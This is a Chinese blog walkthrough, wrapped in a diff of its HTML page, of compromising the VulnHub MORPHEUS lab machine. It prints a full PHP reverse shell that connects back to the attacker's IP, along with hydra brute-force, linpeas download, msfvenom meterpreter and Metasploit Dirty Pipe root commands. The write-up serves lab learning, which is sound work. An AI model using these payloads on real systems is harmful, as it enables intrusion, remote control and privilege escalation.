@@ -1,0 +1,364 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>打靶记录(二七)之VulnHubMORPHEUS | MikannseのSekai</title><meta name="author" content="Mikannse"><meta name="copyright" content="Mikannse"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="端口扫描主机发现 sudo nmap -sn 192.168.162.0&#x2F;24  新增的192.168.162.144为待渗透靶机   竟然开了两个http服务？ web访问网页，发现了一段话，发现一个叫jaybeale的人名还有一个类似团队名inguardians 。  扫目录，发现有四个。robots.txt里面没东西，graffiti.txt里面有一个人名Morpheus 然后其他两个文件都">
+<meta property="og:type" content="article">
+<meta property="og:title" content="打靶记录(二七)之VulnHubMORPHEUS">
+<meta property="og:url" content="http://mikannse.space/2023/08/07/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%BA%8C%E4%B8%83)%E4%B9%8BVulnHubMORPHEUS/index.html">
+<meta property="og:site_name" content="MikannseのSekai">
+<meta property="og:description" content="端口扫描主机发现 sudo nmap -sn 192.168.162.0&#x2F;24  新增的192.168.162.144为待渗透靶机   竟然开了两个http服务？ web访问网页，发现了一段话，发现一个叫jaybeale的人名还有一个类似团队名inguardians 。  扫目录，发现有四个。robots.txt里面没东西，graffiti.txt里面有一个人名Morpheus 然后其他两个文件都">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://s2.loli.net/2023/06/22/PMAjL6lORKa5CGy.jpg">
+<meta property="article:published_time" content="2023-08-07T12:41:50.000Z">
+<meta property="article:modified_time" content="2023-08-07T12:45:17.585Z">
+<meta property="article:author" content="Mikannse">
+<meta property="article:tag" content="网安">
+<meta property="article:tag" content="渗透测试">
+<meta property="article:tag" content="打靶">
+<meta property="article:tag" content="linux">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s2.loli.net/2023/06/22/PMAjL6lORKa5CGy.jpg"><link rel="shortcut icon" href="/img/icon.jpg"><link rel="canonical" href="http://mikannse.space/2023/08/07/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%BA%8C%E4%B8%83)%E4%B9%8BVulnHubMORPHEUS/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":true,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"limitCount":50,"languages":{"author":"作者: Mikannse","link":"链接: ","source":"来源: MikannseのSekai","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '打靶记录(二七)之VulnHubMORPHEUS',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: undefined,
+  isToc: true,
+  postUpdate: '2023-08-07 20:45:17'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+</head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><script>(()=>{
+  const $loadingBox = document.getElementById('loading-box')
+  const $body = document.body
+  const preloader = {
+    endLoading: () => {
+      $body.style.overflow = ''
+      $loadingBox.classList.add('loaded')
+    },
+    initLoading: () => {
+      $body.style.overflow = 'hidden'
+      $loadingBox.classList.remove('loaded')
+    }
+  }
+
+  preloader.initLoading()
+  window.addEventListener('load',() => { preloader.endLoading() })
+
+  if (true) {
+    document.addEventListener('pjax:send', () => { preloader.initLoading() })
+    document.addEventListener('pjax:complete', () => { preloader.endLoading() })
+  }
+})()</script><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://s2.loli.net/2023/06/22/PMAjL6lORKa5CGy.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">274</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">70</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.jsdelivr.net/gh/yjr-1100/Photobag/githubioimg/background_4k.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="MikannseのSekai"><span class="site-name">MikannseのSekai</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">打靶记录(二七)之VulnHubMORPHEUS</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-08-07T12:41:50.000Z" title="发表于 2023-08-07 20:41:50">2023-08-07</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-08-07T12:45:17.585Z" title="更新于 2023-08-07 20:45:17">2023-08-07</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%BD%91%E5%AE%89/">网安</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">1.1k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>4分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="打靶记录(二七)之VulnHubMORPHEUS"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><p>主机发现</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">sudo nmap -sn 192.168.162.0/24</span><br></pre></td></tr></tbody></table></figure>
+
+<p>新增的192.168.162.144为待渗透靶机</p>
+<p><img src="/images/morpheus/image-20230807183947688.png"></p>
+<p><img src="/images/morpheus/image-20230807184039236.png"></p>
+<p>竟然开了两个http服务？</p>
+<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><p>访问网页，发现了一段话，发现一个叫jaybeale的人名还有一个类似团队名inguardians 。</p>
+<p><img src="/images/morpheus/image-20230807184827931.png"></p>
+<p>扫目录，发现有四个。robots.txt里面没东西，graffiti.txt里面有一个人名Morpheus</p>
+<p>然后其他两个文件都没有权限访问。emmm然后80端口就下不去了。看看81端口，发现是一个登录界面,是get请求，也许可以获得的两个人名来爆破</p>
+<p>新建一个users.txt里面输入两个人名</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">hydra -l users.txt -P /usr/share/wordlists/rockyou.txt 192.168.162.144 -s 81 http-get</span><br></pre></td></tr></tbody></table></figure>
+
+<p>发现爆破不出来，看看WP，发现扫目录竟然漏了一个目录，还有一个graffiti.php目录，看来-x参数还要加入php。</p>
+<h1 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h1><p>抓个包看看，发现有传参，但是貌似不能包含/etc/passwd，利用不了。试了一下也没有远程文件包含。但是发现message里面的信息会残留，但是也没有xss啊。但是当我们打开graffiti.txt，发现我们在php界面输入的内容都会显示，也就是说我们输入的东西会生成在file参数的文件里。</p>
+<p><img src="/images/morpheus/image-20230807192625577.png"></p>
+<p>试着写一个反弹shell,发现访问之后触发不了。看了一下好像有些字符没传过去，直接传</p>
+<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">set_time_limit</span> (<span class="number">0</span>);</span><br><span class="line"><span class="variable">$VERSION</span> = <span class="string">"1.0"</span>;</span><br><span class="line"><span class="variable">$ip</span> = <span class="string">'192.168.162.138'</span>;  <span class="comment">// CHANGE THIS</span></span><br><span class="line"><span class="variable">$port</span> = <span class="number">1234</span>;       <span class="comment">// CHANGE THIS</span></span><br><span class="line"><span class="variable">$chunk_size</span> = <span class="number">1400</span>;</span><br><span class="line"><span class="variable">$write_a</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="variable">$error_a</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="variable">$shell</span> = <span class="string">'uname -a; w; id; /bin/sh -i'</span>;</span><br><span class="line"><span class="variable">$daemon</span> = <span class="number">0</span>;</span><br><span class="line"><span class="variable">$debug</span> = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">function_exists</span>(<span class="string">'pcntl_fork'</span>)) {</span><br><span class="line">	<span class="comment">// Fork and have the parent process exit</span></span><br><span class="line">	<span class="variable">$pid</span> = <span class="title function_ invoke__">pcntl_fork</span>();</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="variable">$pid</span> == -<span class="number">1</span>) {</span><br><span class="line">		<span class="title function_ invoke__">printit</span>(<span class="string">"ERROR: Can't fork"</span>);</span><br><span class="line">		<span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">	}</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> (<span class="variable">$pid</span>) {</span><br><span class="line">		<span class="keyword">exit</span>(<span class="number">0</span>);  <span class="comment">// Parent exits</span></span><br><span class="line">	}</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// Make the current process a session leader</span></span><br><span class="line">	<span class="comment">// Will only succeed if we forked</span></span><br><span class="line">	<span class="keyword">if</span> (<span class="title function_ invoke__">posix_setsid</span>() == -<span class="number">1</span>) {</span><br><span class="line">		<span class="title function_ invoke__">printit</span>(<span class="string">"Error: Can't setsid()"</span>);</span><br><span class="line">		<span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">	}</span><br><span class="line">	</span><br><span class="line">	<span class="variable">$daemon</span> = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">} <span class="keyword">else</span> {</span><br><span class="line">	<span class="title function_ invoke__">printit</span>(<span class="string">"WARNING: Failed to daemonise.  This is quite common and not fatal."</span>);</span><br><span class="line">}</span><br><span class="line"><span class="title function_ invoke__">chdir</span>(<span class="string">"/"</span>);</span><br><span class="line"><span class="title function_ invoke__">umask</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$sock</span> = <span class="title function_ invoke__">fsockopen</span>(<span class="variable">$ip</span>, <span class="variable">$port</span>, <span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="number">30</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$sock</span>) {</span><br><span class="line">	<span class="title function_ invoke__">printit</span>(<span class="string">"<span class="subst">$errstr</span> (<span class="subst">$errno</span>)"</span>);</span><br><span class="line">	<span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="variable">$descriptorspec</span> = <span class="keyword">array</span>(</span><br><span class="line">   <span class="number">0</span> =&gt; <span class="keyword">array</span>(<span class="string">"pipe"</span>, <span class="string">"r"</span>),  <span class="comment">// stdin is a pipe that the child will read from</span></span><br><span class="line">   <span class="number">1</span> =&gt; <span class="keyword">array</span>(<span class="string">"pipe"</span>, <span class="string">"w"</span>),  <span class="comment">// stdout is a pipe that the child will write to</span></span><br><span class="line">   <span class="number">2</span> =&gt; <span class="keyword">array</span>(<span class="string">"pipe"</span>, <span class="string">"w"</span>)   <span class="comment">// stderr is a pipe that the child will write to</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="variable">$process</span> = <span class="title function_ invoke__">proc_open</span>(<span class="variable">$shell</span>, <span class="variable">$descriptorspec</span>, <span class="variable">$pipes</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">is_resource</span>(<span class="variable">$process</span>)) {</span><br><span class="line">	<span class="title function_ invoke__">printit</span>(<span class="string">"ERROR: Can't spawn shell"</span>);</span><br><span class="line">	<span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">stream_set_blocking</span>(<span class="variable">$pipes</span>[<span class="number">0</span>], <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">stream_set_blocking</span>(<span class="variable">$pipes</span>[<span class="number">1</span>], <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">stream_set_blocking</span>(<span class="variable">$pipes</span>[<span class="number">2</span>], <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">stream_set_blocking</span>(<span class="variable">$sock</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">printit</span>(<span class="string">"Successfully opened reverse shell to <span class="subst">$ip</span>:<span class="subst">$port</span>"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) {</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="title function_ invoke__">feof</span>(<span class="variable">$sock</span>)) {</span><br><span class="line">		<span class="title function_ invoke__">printit</span>(<span class="string">"ERROR: Shell connection terminated"</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	}</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="title function_ invoke__">feof</span>(<span class="variable">$pipes</span>[<span class="number">1</span>])) {</span><br><span class="line">		<span class="title function_ invoke__">printit</span>(<span class="string">"ERROR: Shell process terminated"</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	}</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// Wait until a command is end down $sock, or some</span></span><br><span class="line">	<span class="comment">// command output is available on STDOUT or STDERR</span></span><br><span class="line">	<span class="variable">$read_a</span> = <span class="keyword">array</span>(<span class="variable">$sock</span>, <span class="variable">$pipes</span>[<span class="number">1</span>], <span class="variable">$pipes</span>[<span class="number">2</span>]);</span><br><span class="line">	<span class="variable">$num_changed_sockets</span> = <span class="title function_ invoke__">stream_select</span>(<span class="variable">$read_a</span>, <span class="variable">$write_a</span>, <span class="variable">$error_a</span>, <span class="literal">null</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// If we can read from the TCP socket, send</span></span><br><span class="line">	<span class="comment">// data to process's STDIN</span></span><br><span class="line">	<span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$sock</span>, <span class="variable">$read_a</span>)) {</span><br><span class="line">		<span class="keyword">if</span> (<span class="variable">$debug</span>) <span class="title function_ invoke__">printit</span>(<span class="string">"SOCK READ"</span>);</span><br><span class="line">		<span class="variable">$input</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$sock</span>, <span class="variable">$chunk_size</span>);</span><br><span class="line">		<span class="keyword">if</span> (<span class="variable">$debug</span>) <span class="title function_ invoke__">printit</span>(<span class="string">"SOCK: <span class="subst">$input</span>"</span>);</span><br><span class="line">		<span class="title function_ invoke__">fwrite</span>(<span class="variable">$pipes</span>[<span class="number">0</span>], <span class="variable">$input</span>);</span><br><span class="line">	}</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$pipes</span>[<span class="number">1</span>], <span class="variable">$read_a</span>)) {</span><br><span class="line">		<span class="keyword">if</span> (<span class="variable">$debug</span>) <span class="title function_ invoke__">printit</span>(<span class="string">"STDOUT READ"</span>);</span><br><span class="line">		<span class="variable">$input</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$pipes</span>[<span class="number">1</span>], <span class="variable">$chunk_size</span>);</span><br><span class="line">		<span class="keyword">if</span> (<span class="variable">$debug</span>) <span class="title function_ invoke__">printit</span>(<span class="string">"STDOUT: <span class="subst">$input</span>"</span>);</span><br><span class="line">		<span class="title function_ invoke__">fwrite</span>(<span class="variable">$sock</span>, <span class="variable">$input</span>);</span><br><span class="line">	}</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// If we can read from the process's STDERR</span></span><br><span class="line">	<span class="comment">// send data down tcp connection</span></span><br><span class="line">	<span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$pipes</span>[<span class="number">2</span>], <span class="variable">$read_a</span>)) {</span><br><span class="line">		<span class="keyword">if</span> (<span class="variable">$debug</span>) <span class="title function_ invoke__">printit</span>(<span class="string">"STDERR READ"</span>);</span><br><span class="line">		<span class="variable">$input</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$pipes</span>[<span class="number">2</span>], <span class="variable">$chunk_size</span>);</span><br><span class="line">		<span class="keyword">if</span> (<span class="variable">$debug</span>) <span class="title function_ invoke__">printit</span>(<span class="string">"STDERR: <span class="subst">$input</span>"</span>);</span><br><span class="line">		<span class="title function_ invoke__">fwrite</span>(<span class="variable">$sock</span>, <span class="variable">$input</span>);</span><br><span class="line">	}</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$sock</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$pipes</span>[<span class="number">0</span>]);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$pipes</span>[<span class="number">1</span>]);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$pipes</span>[<span class="number">2</span>]);</span><br><span class="line"><span class="title function_ invoke__">proc_close</span>(<span class="variable">$process</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Like print, but does nothing if we've daemonised ourself</span></span><br><span class="line"><span class="comment">// (I can't figure out how to redirect STDOUT like a proper daemon)</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">printit</span> (<span class="params"><span class="variable">$string</span></span>) </span>{</span><br><span class="line">	<span class="keyword">if</span> (!<span class="variable">$daemon</span>) {</span><br><span class="line">		<span class="keyword">print</span> <span class="string">"<span class="subst">$string</span>\n"</span>;</span><br><span class="line">	}</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></tbody></table></figure>
+
+<p>file改成reverseshell.php,因为是追加在后面所以要换一个文件名尝试。访问发现连接成功。</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">python3 -c "import pty;pty.spawn('/bin/bash')"</span><br></pre></td></tr></tbody></table></figure>
+
+<p>看看/etc/passwd发现有trinity，cypher两个用户</p>
+<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>既然拿到了www-data的权限，翻一翻/var目录，在/var/nginx/html目录发现一个</p>
+<p>.htpasswd。发现一个用户hash。</p>
+<p>cypher:$apr1$e9o8Y7Om$5zgDW6WOO6Fl8rCC7jpvX0</p>
+<p>竟然爆不出来吗（悲</p>
+<p>没办法了，传一个linpeas</p>
+<p>在/tmp目录wget <a target="_blank" rel="noopener" href="http://192.168.162.138/linpeas.sh">http://192.168.162.138/linpeas.sh</a></p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">chmod +x linpeas.sh</span><br></pre></td></tr></tbody></table></figure>
+
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">./linpeas.sh</span><br></pre></td></tr></tbody></table></figure>
+
+<p>为什么我运行peas得到的信息和别人的都不一样。。。无论是win还是lin,算了用msf</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.162.138 LPORT=1235 -f elf&gt;shell.elf</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/images/morpheus/image-20230807202547592.png"></p>
+<p>转移shell到msf</p>
+<p>background在后台运行</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">search suggester</span><br><span class="line">use 0</span><br><span class="line">set session 2(看自己后台运行的是哪个session)</span><br><span class="line">run</span><br></pre></td></tr></tbody></table></figure>
+
+<p>报告了一堆可利用的漏洞</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">use exploit/linux/local/cve_2022_0847_dirtypipe</span><br><span class="line">set LHOST 192.168.162.138</span><br><span class="line">set LPORT 1235</span><br><span class="line">set session 2</span><br><span class="line">run</span><br></pre></td></tr></tbody></table></figure>
+
+<p>然后发现我们已经是root了</p>
+<h1 id="碎碎念"><a href="#碎碎念" class="headerlink" title="碎碎念"></a>碎碎念</h1><p>虽然靶机的标注难度是中等偏难，但其实打下来感觉还行，就是linpeas太搞人心态了，msf是真好用（。看了一下其他大佬的WP，graffiti.php那里其实是可以文件包含的，用PHP伪协议来读源码，也可以知道用处。</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="http://mikannse.space">Mikannse</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://mikannse.space/2023/08/07/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%BA%8C%E4%B8%83)%E4%B9%8BVulnHubMORPHEUS/">http://mikannse.space/2023/08/07/打靶记录(二七)之VulnHubMORPHEUS/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://mikannse.space" target="_blank">MikannseのSekai</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E7%BD%91%E5%AE%89/">网安</a><a class="post-meta__tags" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a><a class="post-meta__tags" href="/tags/%E6%89%93%E9%9D%B6/">打靶</a><a class="post-meta__tags" href="/tags/linux/">linux</a></div><div class="post_share"><div class="social-share" data-image="https://s2.loli.net/2023/06/22/PMAjL6lORKa5CGy.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/08/08/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%BA%8C%E5%85%AB)%E4%B9%8BTHMRa/" title="打靶记录(二八)之THMRa"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">打靶记录(二八)之THMRa</div></div></a></div><div class="next-post pull-right"><a href="/2023/08/06/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%BA%8C%E5%85%AD)%E4%B9%8BVulnHubLuPinone/" title="打靶记录(二六)之VulnHubLuPinone"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div 